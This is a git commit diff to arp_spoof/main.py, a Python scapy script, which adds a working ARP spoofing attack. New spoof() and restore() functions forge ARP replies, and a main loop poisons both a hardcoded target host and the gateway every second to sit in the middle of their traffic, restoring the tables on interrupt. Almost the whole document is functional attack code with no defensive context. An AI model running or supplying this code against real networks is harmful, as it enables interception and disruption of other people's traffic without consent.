54ec846f3d5c510398d249637d119d1c63d2f2f6
Alex Clevenger <alexbclevenger@gmail.com>
2023-07-06 18:34:08 -0400

    final friday

--- arp_spoof/main.py
+++ arp_spoof/main.py
@@ -1,6 +1,7 @@
 #!venv/bin/python3
 
 import scapy.all as scapy
+import time 
 
 def network_scan(subnetmask):
     target_ip = scapy.get_if_addr(scapy.conf.iface)
@@ -33,9 +34,31 @@ def network_scan(subnetmask):
 def get_gw_ip():
     return scapy.conf.route.route("0.0.0.0")[2]
 
-def spoof(target_ip):
-    return scapy.getmacbyip(target_ip)
+def spoof(spoof_ip, target_ip):
+    packet = scapy.ARP(op = 2, psrc = spoof_ip, hwdst = scapy.getmacbyip(target_ip), pdst = target_ip) #implied my mac for hwsrc
+    scapy.send(packet, verbose = False)
+
+def restore(src_ip, target_ip):
+    packet = scapy.ARP(op = 2, psrc = src_ip, hwsrc = scapy.getmacbyip(src_ip), hwdst = scapy.getmacbyip(target_ip), pdst = target_ip) #op is response
+    scapy.send(packet, verbose = False)
 
 if __name__ == '__main__':
     # network_scan('/16')
-    print(spoof('10.1.4.171'))
+    gw_ip = get_gw_ip()
+    target = '10.1.4.171'
+    packets_sent = 0
+    frequency = 1 #seconds
+    while(1):
+        try: 
+            spoof(gw_ip, target) #tell the target that the router is associated with my mac address
+            spoof(target, gw_ip) #tell the router that the target is associated with my mac address
+            packets_sent = packets_sent + 2
+            print(f'{packets_sent} updates to ARP tables.')
+            time.sleep(frequency)
+        except KeyboardInterrupt:
+            print('\nRestoring original ARP tables...')
+            restore(gw_ip, target) 
+            restore(target, gw_ip)
+            print('Restored. Exiting.')
+            exit(0)
+
